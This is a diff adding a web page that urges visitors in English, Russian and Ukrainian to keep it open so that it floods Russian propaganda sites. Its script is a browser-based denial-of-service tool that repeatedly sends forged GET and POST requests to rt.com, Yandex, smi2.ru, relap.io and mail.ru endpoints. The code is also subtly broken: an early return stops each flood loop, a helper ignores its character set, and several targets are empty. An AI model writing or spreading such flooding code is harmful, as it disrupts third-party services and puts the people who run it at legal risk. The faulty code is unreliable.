@@ -1,0 +1,204 @@
+
+
+<head>
+    <meta charset="utf-8" />
+    <title>russia MUST BE STOPPED!</title>
+  </head>
+  <body>
+    <h1>Russia MUST BE STOPPED! Help Ukraine WIN!</h1>
+    <table width="100%">
+      <tr>
+        <td width="30%">
+          <h3>English version</h3>
+          <p>The "official" news in the Russian Federation is mostly fake and we believe it is
+              better to shut them down and let people switch to trustful news.</p>
+          <p>Please, just open this page and let it be open on your devices. It will flood the
+              Russian propaganda websites and pose a huge load on their infrastructure.</p>
+          <p>Your browser will be slow. It's ok, don't worry and keep it run.</p>
+          <p>A small contribution from each of us will save Ukraine 🙏</p>
+        </td>
+        <td width="30%">
+          <h3>Русская версия</h3>
+          <p>«Официальные» новости в РФ полны пропаганды и транслируют лживую информацию о
+              событиях на Украине. Мы считаем, что лучше их закрыть и позволить людям
+              переключиться на достоверные новости.</p>
+          <p>Пожалуйста, откройте эту страницу на ваших устройствах. Это зальёт российские
+              пропагандистские сайты запросами и создаст огромную нагрузку на их
+              инфраструктуру.</p>
+          <p>Ваш браузер будет работать медленно. Все в порядке, не волнуйтесь и держите его
+              открытым.</p>
+          <p>Небольшой вклад каждого из нас спасет Украину 🙏</p>
+        </td>
+        <td width="30%">
+          <h3>Українська версія</h3>
+          <p>«Офіційні» новини в РФ сповнені пропаганди та транслюють брехливу інформацію про
+              події в Україні. Ми вважаємо, що краще їх закрити та дозволити людям переключитися
+              на достовірні новини.</p>
+          <p>Будь ласка, відкрийте цю сторінку на вашому пристрої. Це закидає російські
+              пропагандистські сайти запитами та створить величезне навантаження на їхню
+              інфраструктуру.</p>
+          <p>Ваш браузер працюватиме повільно. Все гаразд, не хвилюйтеся та тримайте його
+              відкритим.</p>
+          <p>Невеликий внесок кожного з нас врятує Україну 🙏</p>
+        </td>
+      </tr>
+     </table>
+     <div id="stats"></div>
+  
+  <script>
+  const chars1       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const chars1Length = chars1.length;
+
+  const chars2       = '0123456789abcdef';
+  const chars2Length = chars1.length;
+
+  const makeAnyID = (length, chars, charsLenght) => {
+      var result = '';
+      for (var i = 0; i < length; i++) {
+          result += chars1.charAt(Math.floor(Math.random() * chars1Length));
+      }
+      return result;
+  };
+
+  const makeid = (length) => makeAnyID(length, chars1, chars1Length);
+  const makeidHexa = (length) => makeAnyID(length, chars2, chars2Length);
+
+  var targets = {
+    // GET:
+    'https://gum.criteo.com/sid/json?origin=publishertag&domain=rt.com&sn=ChromeSyncframe&so=0&topUrl=russian.rt.com&cw=1&lsw=1': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://mc.yandex.ru/watch/344709/1?wmode=7&page-url=https%3A%2F%2Fwww.gazeta.ru%2Fpolitics%2Fnews%2F2022%2F02%2F26%2F17350597.shtml%3Fupdated&page-ref=https%3A%2F%2Fwww.gazeta.ru%2Fpolitics%2Fnews%2F2022%2F02%2F26%2F17350597.shtml&nohit=1&charset=utf-8&cnt-class=1&browser-info=pv%3A1%3Agdpr%3A14%3Avf%3A7oivoctnsftpvxmegov%3Afu%3A0%3Aen%3Autf-8%3Ala%3Aen-US%3Av%3A760%3Acn%3A3%3Adp%3A1%3Als%3A1040796888110%3Ahid%3A905254112%3Az%3A420%3Ai%3A20220227104955%3Aet%3A1645933795%3Ac%3A1%3Arn%3A915453336%3Au%3A1645933161222770635%3Aw%3A1688x542%3As%3A3440x1440x24%3Ask%3A1%3Acpf%3A1%3Aeu%3A0%3Ans%3A1645933789441%3Awv%3A2%3Aco%3A0%3Aadb%3A2%3App%3A3629563401%3Arqnl%3A1%3Ast%3A1645933795%3At%3A%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F%20%D0%BF%D0%BE%D0%B4%D1%82%D0%B2%D0%B5%D1%80%D0%B4%D0%B8%D0%BB%D0%B0%20%D0%A2%D1%83%D1%80%D1%86%D0%B8%D0%B8%20%D0%B3%D0%BE%D1%82%D0%BE%D0%B2%D0%BD%D0%BE%D1%81%D1%82%D1%8C%20%D0%BA%C2%A0%D1%83%D1%80%D0%B5%D0%B3%D1%83%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8E%20%D0%BA%D1%80%D0%B8%D0%B7%D0%B8%D1%81%D0%B0%20%D0%BD%D0%B0%C2%A0%D0%A3%D0%BA%D1%80%D0%B0%D0%B8%D0%BD%D0%B5%20-%20%D0%93%D0%B0%D0%B7%D0%B5%D1%82%D0%B0.Ru%20%7C%20%D0%9D%D0%BE%D0%B2%D0%BE%D1%81%D1%82%D0%B8&t=gdpr%2814%29mc%28p-7%29lt%28128900%29aw%281%29ti%282%29': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://russian.rt.com/widget/news-of-hour/json': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://yandex.ru/set/s/rsya-tag-users/data?referrer=https%3A%2F%2Frussian.rt.com%2F': { number_of_requests: 0, number_of_errored_responses: 0 },
+    // POST:
+    'https://smi2.ru/newdata/jsapi?action=news': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'Referer': 'https://russian.rt.com/',
+                   'Content-Type': 'multipart/form-data',
+                },
+                body: JSON.stringify({
+                    "suid": makeid(72),
+                    "block_id": 90702,
+                    "source_block_id": 0,
+                    "topic_id": 0,
+                    "strategy_id": 0,
+                    "count": 10,
+                    "fields": 14,
+                    "filter_news": []
+                })
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+    'https://relap.io/api/v7/stat': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/json',
+                   'authority': 'relap.io',
+
+                },
+                body: JSON.stringify({
+                  "session_secret":makeid(6),
+                  "events":[{"type":"rec_load","widget_cfg_id":makeid(16),"rec_ctx":"oxQWi5zvX2DXx08MeL_EdTkLdDWj_aJJ5amAnWnr__D0GT5GF2vRA73Nf7rSGgpa5nL049SCtj9t8Ani1xiXQvQrTDYD6KiUmS7i1gTHgrXhRJpzrNyMG_GU7drvB6pNKynitLWoQCzaC25C9bhjscuLSH4ReD8tJn86zdQ4GoYyKW5LQKWJ0UL4-ubIyPJodvFqBL-c5H3L8Ur_7PnmXDJDBPrrqZXwUIMtozjPE1VCFWNkQRnPzL7-3Bd1MCZ17XXanAE38O8JNJaPCXBuv_5-FZ8BORApp6o6xQ9TdIAMRK_jfGew4FlCYvFrMsFBnHFOAyv0aiOFtl-r1Se7Qc-_1bDZCWxcUaGqA_pPPEBq2xNgEglVaduWppWfyqYv2eYUpe5iEgRjwkR4UZFzElldeCUwlFWcCoiuD1inc7YWF3XEbxhiJlWTbk2i18LgsAoK4cBarWEFL2KKaeYK7ECI5Hbl_LPEknby4zfsnKDyoR2s633STUlfosOe-Z5HSR1J29B8lIDJRNpezN9PPh20jZNFSgfhSEg_fHGgOF7nWxn43rzDY2GWkyiFw5MoX57NQQH-_Q_qvhmgbTVaHw42EM4uePt4xE-klkOZCzc:R2CJZA","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"njEzch-OmyatjFll3fIcxCxFD0lH65OQ9inKovYOjFCv7_Csfmm9yaTVcAfO2qd6puZ2kQGF9zRd5MgeUg3cGLCxohwBn1u7AKlOvuL2fLbtg2FbgaxpvPv3cTnXLp1O:CiMIQA","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"-1LSx0Wja_2dSmD5lb8OPoxMjVYujsGPwrl7MkOuGnM6pkxTf2mIzTJRVZvIRM4fAQpJ3nIM16_purzZPlxoADMYzb72VnwQqHu5DQ7HL1uf_N2b5Ha6icEay7hBmO77OcTrrggSO8v0Y0B0a7fFSy2YnY_bAWd6Z9xLFWRwBByn3KF4u8lvjIV870kBXQx1CvLuWIbZSIP0_B8OSj9Mfr8hrccKMRh1JlSFe4C9S6-GG313DiJk-fbuUxdZq2mQ-ESxGPmTcsjIgEWyYVcVkwErHSvb5-m3_Wzz4YE5kMU:P48wSQ","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"2AiQJzdSaGIUxq1oXHpyW1BYPMcWCKtz1IweCwDLicUhaVkYTlLQutoC8gNgAEVN7K57oVb61xQoV3-EBhsVqQE2dAhKjwxbj7SYxN3Pr8f2sFQ8vppSUa4V-R9C--7S:fJDfpQ","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"hXYDzUwQANZyANO32O-mmmTG68rcVvwve4p_iJFeSdAswAUW7x1k6FrIspHXezxEwwYiXiKaZ5gtWQdf8wSETkYksByQiHhlt6qPeGp3qOGYjx-7cG5Im5ngy8ZV72gI:JzJCZw","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":"fe86344699d630b7e74cfffc13ea82e3"},{"type":"rec_load","widget_cfg_id":"mHd3AjX0inCKUFBQ","rec_ctx":"-soMvc8b8xBfksxjPsZCrI4GHylRwE15ikS4_5S0uWgLNcAMyUphpPq0n6AcMyxxZxJcHUQipBWz5DUzvQsqHxqZx54UY2kbTXC4WsZ8N25ICyvscavvJzW8PrEyRrt0:rUjhxA","rec_group_ctx":"XOGUFLBQboOwxnRG579TQoywnzTEm-zSFhqSCvyjGKST5qIL6QaZNrIvqJb4xz_TvdJBZWJ1vSANk4E6aLklNpR4dg79US6RQq0WxxRv--83OBujbVOFawsACO5HE_Fi7MaqvxWjNSOuq-2hcxUx2A:ZnbFEg","url":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","referer":"https://russian.rt.com/world/article/968210-sovbez-oon-rezolyuciya-rossiya-ukraina","session_id":makeidHexa(32)}]})
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+    'https://ad.mail.ru/hbid_yandex/': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/x-www-form-urlencoded',
+                   'authority': 'ad.mail.ru',
+
+                },
+                body: JSON.stringify({"places":[{"id":"dummy0","placementId":"878949","sizes":[[240,400]]},{"id":"dummy1","placementId":"893271","sizes":[[240,400]]}],"settings":{"currency":"RUB","windowSize":{"width":1272,"height":542}}})
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+    '': { number_of_requests: 0, number_of_errored_responses: 0 },
+    '': { number_of_requests: 0, number_of_errored_responses: 0 },
+    '': { number_of_requests: 0, number_of_errored_responses: 0 },
+  }
+
+  const trunc = (str, num) => {
+    if (str.length > num) {
+      return str.slice(0, num) + "...";
+    } else {
+      return str;
+    }
+  };
+  var statsEl = document.getElementById('stats');
+  function printStats() {
+    statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + trunc(target, 100) + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  }
+  setInterval(printStats, 1000);
+  
+  var CONCURRENCY_LIMIT = 1000
+  var queue = []
+  
+  async function fetchWithTimeout(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+
+    var fetchOpt;
+    if (targets[resource].process) {
+        fetchOpt = targets[resource].process();
+    } else {
+        fetchOpt = {
+            method: 'GET'
+         };
+    }
+    fetchOpt['signal'] = controller.signal;
+    fetchOpt['mode'] = 'no-cors';
+
+    console.log(`resource: ${resource}`);
+    console.log(`options: ${JSON.stringify(options)}`);
+    console.log(`fetchOpt: ${JSON.stringify(fetchOpt)}`);
+
+    return fetch(resource, fetchOpt).then((response) => {
+      clearTimeout(id);
+      return response;
+    }).catch((error) => {
+      clearTimeout(id);
+      throw error;
+    });
+  }
+  
+  async function flood(target) {
+    for (var i = 0;; ++i) {
+      if (queue.length > CONCURRENCY_LIMIT) {
+        await queue.shift()
+      }
+      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+      queue.push(
+        fetchWithTimeout(target+rand, { timeout: 2000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            targets[target].number_of_errored_responses++;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              targets[target].number_of_errored_responses++;
+            }
+            targets[target].number_of_requests++;
+          })
+  
+      )
+      return
+    }
+  }
+  
+  // Start
+  Object.keys(targets).map(flood)
+  </script>
+  </body>
+      
